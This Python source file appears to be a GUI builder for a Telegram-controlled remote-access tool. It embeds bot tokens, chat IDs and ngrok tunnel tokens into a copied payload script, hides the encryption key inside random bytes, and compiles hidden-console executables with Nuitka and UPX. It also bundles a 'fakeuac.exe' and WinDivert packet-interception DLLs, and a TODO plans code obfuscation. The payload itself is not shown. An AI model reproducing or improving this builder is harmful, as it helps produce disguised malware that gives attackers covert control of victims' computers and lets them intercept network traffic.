# main.py
import random
from telepot import Bot
from telepot.exception import TelegramError
import json
import os
import secrets
import multiprocessing as mp
from multiprocessing.queues import Queue
from queue import Empty
from time import perf_counter, sleep
from shutil import rmtree, copytree
from threading import Thread
from subprocess import Popen, PIPE, STDOUT
from os import chdir, listdir, remove
from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, getsize, basename
import traceback
import webview
from cryptography.fernet import Fernet
from template import html_content

#TODO code and strings obfuscation

# ---------------------------------------------------------------------------
# Paths / constants  (your original values — adjust if needed)
# ---------------------------------------------------------------------------
DEBUG = True
SEND_EXECUTABLE = False
ENCRYPTION = True
TELEGRAM_BOT_FILE_MAX_SIZE = 30 * 1024 * 1024  # 50 MB(I put 30MB just because 50 crashed a lot)
REPO_NAME = abspath("RCPepTelegram")
KEY_PATH = join(REPO_NAME, "key.key")
VENV_PATH = abspath("venv")
PY_FILE_PATH = join(REPO_NAME, "pep2.py")
PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
DLLSL_PATH = join(REPO_NAME, "assets", "dlls")
REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
PY_FILE_MARKER = "PY_FILE_MARKER"
AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
PYTHON_FLAGS = [
    #"-B",
    #"no_docstrings"
]
PYTHON_FLAGS_STRING = " ".join([f"--python-flag={flag} " for flag in PYTHON_FLAGS])
COMPILE_COMMAND = (
    f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
    + PYTHON_FLAGS_STRING +
    f"--windows-console-mode={'force' if DEBUG else 'disable'} "
    "--onefile --onefile-no-compression --follow-imports "
    "--enable-plugin=tk-inter --msvc=latest "
    f"--jobs={os.cpu_count() or 4} --plugin-enable=upx "
    "--include-data-dir=assets/vfx=assets/vfx "
    "--include-data-dir=assets/sfx=assets/sfx "
    "--include-data-dir=assets/model=assets/model "
    "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert.dll "
    "--include-data-file=assets/dlls/WinDivert64.dll=pydivert/windivert_dll/WinDivert64.dll "
    " ".join([f"--include-data-file=assets/dlls/{x}=assets/dlls/{x} " for x in listdir(DLLSL_PATH)]) + " "
    "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe "
    f"--include-data-file={AUTH_FILE_MARKER}=auth.json " +
    ("--include-data-file=key.key=key.key " if ENCRYPTION else "")
)
AUTHS_DIRNAME = abspath("auths")
AUTHS_REPO_PATH = join(REPO_NAME, "auths")
LOG_DIR = join(REPO_NAME, "logs")

# Version
with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
    __version__ = next((l.split("=", 1)[1].strip() for l in fi.read().splitlines() if "__version__" in l), "?.?")

# Utilities (copy_file, clone_directory, compile_worker remain the same as before)

def copy_file(src, dst):
    with open(src, "r", encoding="utf-8") as fi, open(dst, "w", encoding="utf-8") as fo:
        fo.write(fi.read())

def clone_directory(src, dst):
    os.makedirs(dst, exist_ok=True)
    copytree(src, dst, dirs_exist_ok=True)

def create_obfuscated_key_file(output_path: str) -> bytes:
    real_key_b64 = Fernet.generate_key()           # 44 bytes

    jump = random.randrange(1, 16)                # bytes to skip between each key byte

    # Space needed for the scattered key
    key_space = 44 + 43 * jump

    # Total file size
    min_size = key_space + 64
    total_size = random.randrange(min_size, min_size + 65536)

    # Random start position for first key byte
    min_start = 32
    max_start = total_size - key_space - 64
    first_byte_pos = random.randrange(min_start, max_start + 1)

    # Header: RCPTE (5) + jump (1) + start (4) = 10 bytes
    magic = b"RCPTE"
    jump_byte = jump.to_bytes(1, "big")
    start_bytes = first_byte_pos.to_bytes(4, "big")
    header = magic + jump_byte + start_bytes

    data = bytearray(secrets.token_bytes(total_size))
    data[0:len(header)] = header

    # Scatter the 44-byte key
    pos = first_byte_pos
    for b in real_key_b64:
        data[pos] = b
        pos += 1 + jump

    with open(output_path, "wb") as f:
        f.write(data)

    return real_key_b64

def download_file(bot, chatid, path: str) -> None:
    def bsend(message):
        bot.sendMessage(chatid, message)
    print(f"Downloading file: {path}")
    bsend(f"📤 Sending file: {path}")
    if not isfile(path):
        bsend(f"❌ Could not send file.\nThe file `{path}` does not exist or you don't have permission to access it.")
        return

    size = getsize(path)

    if size <= TELEGRAM_BOT_FILE_MAX_SIZE:
        with open(path, "rb") as fi:
            bot.sendDocument(chatid, fi)
            bsend("✅ File has been sent successfully!")
        return

    base_name = basename(path)
    part_size = TELEGRAM_BOT_FILE_MAX_SIZE - (len(base_name) + 10)

    with open(path, "rb") as f:
        part_num = 1
        while True:
            chunk = f.read(part_size)
            if not chunk:
                break

            part_name = f"{base_name}.part{part_num:03d}"
            with open(part_name, "wb") as pf:
                pf.write(chunk)

            with open(part_name, "rb") as pf:
                bot.sendDocument(
                    chatid,
                    pf,
                    caption=f"📦 {base_name} (part {part_num})"
                )

            remove(part_name)
            #bsend(f"📦 Part {part_num} sent.")
            part_num += 1

    bsend("✅ All file parts have been sent successfully!")


def encrypt_file(fernet: Fernet, src_path, dst_path):
    print(f"ENCRYPTING FILE: {src_path} into {dst_path}")
    with open(src_path, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(dst_path, "wb") as f:
        f.write(encrypted)

def encrypt_directory(fernet: Fernet, src_dir, dst_dir):
    os.makedirs(dst_dir, exist_ok=True)
    for root, dirs, files in os.walk(src_dir):
        rel_root = os.path.relpath(root, src_dir)
        dst_root = os.path.join(dst_dir, rel_root)
        os.makedirs(dst_root, exist_ok=True)
        for file in files:
            src_path = os.path.join(root, file)
            dst_path = os.path.join(dst_root, file + ".enc")
            encrypt_file(fernet, src_path, dst_path)

def compile_worker(
    auth_path: str,
    is_foreground: bool,
    output_queue: Queue | None,
):
    def run_and_capture(cmd: str):
        p = Popen(cmd.split(), stdout=PIPE, stderr=STDOUT)
        output = []
        while p.poll() is None:
            line = p.stdout.readline()
            if not line:
                break
            output.append(line)
            if is_foreground and output_queue:
                output_queue.put(line)
        return p.returncode, b"".join(output)

    try:
        chdir(REPO_NAME)
        with open(auth_path, "r", encoding="utf-8") as f:
            auth = json.load(f)
        token = auth["token"].strip()
        chatid = auth["chatid"]
        ngrok_token = auth["ngrok_token"].strip()
        tunnel_provider = auth["tunnel_provider"].strip()
        bot = Bot(token)
        me = bot.getMe()
        bot_username = me["username"]
        source_name = f"{bot_username}.py"

        if ENCRYPTION:
            real_key = create_obfuscated_key_file(KEY_PATH)
            fernet = Fernet(real_key)
            output_queue.put(f"\nKEY FILE GENERATED FOR {bot_username}\n")

        bot.sendMessage(
            chatid,
            f"Your bot is being compiled\n"
            f"TOKEN:{token}\nCHAT_ID:{chatid}\nNGROK:{ngrok_token}\nTUNNEL PROVIDER:{tunnel_provider}\nENCRYPTION:{ENCRYPTION}",
        )
        start = perf_counter()

        copy_file(PY_FILE_PATH, source_name)

        run_and_capture(REQUIREMENTS_COMMAND)
        relative_auth = join("auths", pathsplit(auth_path)[-1])
        compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)

        if ENCRYPTION:
            encrypt_file(
                fernet=fernet,
                src_path=relative_auth,
                dst_path=relative_auth+".enc"
            )
        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth+(".enc" if ENCRYPTION else ""))
        print(f"Running: {compile_cmd}")
        rc, output = run_and_capture(compile_cmd)
       
        cache_dirs = (
            f"{bot_username}.build",
            f"{bot_username}.dist",
            f"{bot_username}.onefile-build",
        )
        try:
            remove(source_name)
            for directory in cache_dirs:
                if isdir(directory):
                    rmtree(directory)
        except Exception:
            pass
        elapsed = (perf_counter() - start) / 60
        bot.sendMessage(chatid, f"Your bot has been compiled in {elapsed:.2f} minutes")
        if rc != 0:
            if isinstance(output, bytes):
                output = output.decode(errors="ignore")
            raise RuntimeError(output)
        if SEND_EXECUTABLE:
            download_file(bot, chatid, f"{bot_username}.exe")
    except Exception as e:
        if is_foreground and output_queue:
            output_queue.put(b"\n[ERROR] Compilation failed\n")
            print(e)
        raise e

# ---------------------------------------------------------------------------
# Poller
# ---------------------------------------------------------------------------
def start_poller(queue):
    def poller():
        while True:
            try:
                while True:
                    line = queue.get_nowait()
                    if isinstance(line, bytes):
                        line = line.decode(errors="ignore")
                    decoded = line.rstrip()
                    if decoded:
                        webview.windows[0].evaluate_js(f'writeOut({decoded!r})')
            except Empty:
                # No more lines right now → small sleep to avoid CPU spin
                import time
                time.sleep(0.1)
                # The thread will naturally exit when the program ends (daemon=True)
    Thread(target=poller, daemon=True).start()

# ---------------------------------------------------------------------------
# API
# ---------------------------------------------------------------------------
class API:
    def check_auths(self):
        if not isdir(AUTHS_DIRNAME):
            return {"exists": False, "files": []}
        files = [f for f in listdir(AUTHS_DIRNAME) if f.lower().endswith(".json")]
        return {"exists": bool(files), "files": sorted(files)}

    def get_default_auth(self):
        path = join(REPO_NAME, "auth.json")
        if isfile(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except:
                pass
        return {}

    def check_token(self, token):
        if not token.strip():
            webview.windows[0].set_title(f"RCPT Compiler Nuitka v{__version__}")
            return
        try:
            bot = Bot(token.strip())
            me = bot.getMe()
            name = me.get("first_name", "Bot")
            username = me["username"]
            webview.windows[0].set_title(f"{name} (@{username}) – RCPT Compiler Nuitka v{__version__}")
        except:
            webview.windows[0].set_title(f"RCPT Compiler Nuitka v{__version__}")

    def mass_compile(self, selected_files):
        if not selected_files:
            webview.windows[0].evaluate_js('writeOut("[INFO] No files selected")')
            return

        auth_paths = [join(AUTHS_DIRNAME, f) for f in selected_files]

        webview.windows[0].evaluate_js('clearLog()')
        webview.windows[0].evaluate_js(f'writeOut("Compiling {len(selected_files)} selected auth file(s)...")')
        webview.windows[0].evaluate_js('writeOut("───────────────────────────────────────")')

        clone_directory(AUTHS_DIRNAME, AUTHS_REPO_PATH)

        queue = mp.Queue()
        processes = []

        for i, path in enumerate(auth_paths):
            foreground = (i == 0)
            p = mp.Process(target=compile_worker, args=(path, foreground, queue if foreground else None))
            p.start()
            processes.append(p)

        def waiter():
            for p in processes:
                p.join()
            webview.windows[0].evaluate_js('writeOut("\\nAll selected compilations finished")')

        Thread(target=waiter, daemon=True).start()
        start_poller(queue)

    def run_compile(self, token, chatid, ngrok, provider):
        webview.windows[0].evaluate_js('clearLog()')
        token = token.strip()
        if not token:
            msg = "[ERROR] Bot Token is required"
            webview.windows[0].evaluate_js(f'writeOut({msg!r})')
            return [msg]

        try:
            bot = Bot(token)
            me = bot.getMe()
            username = me["username"]

            auth = {
                "token": token,
                "chatid": chatid.strip(),
                "ngrok_token": ngrok.strip(),
                "tunnel_provider": provider.strip() or "Ngrok"
            }

            os.makedirs(AUTHS_REPO_PATH, exist_ok=True)
            auth_path = join(AUTHS_REPO_PATH, f"{username}.json")
            with open(auth_path, "w", encoding="utf-8") as f:
                json.dump(auth, f, indent=2)

            queue = mp.Queue()
            p = mp.Process(target=compile_worker, args=(auth_path, True, queue))
            p.start()

            def waiter():
                p.join()
                webview.windows[0].evaluate_js('writeOut("\\nSingle compilation finished")')

            Thread(target=waiter, daemon=True).start()
            start_poller(queue)

            return []
        except Exception as e:
            msg = f"[ERROR] {str(e)}"
            webview.windows[0].evaluate_js(f'writeOut({msg!r})')
            return [msg]

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    mp.freeze_support()
    if isdir(REPO_NAME):
        api = API()
        window = webview.create_window(
            f"RCPT Compiler Nuitka v{__version__}",
            html=html_content,
            js_api=api,
            width=820,
            height=920,
            min_size=(720, 800)
        )
        webview.start()
    else:
        print(f"Missing repository folder: {REPO_NAME}")
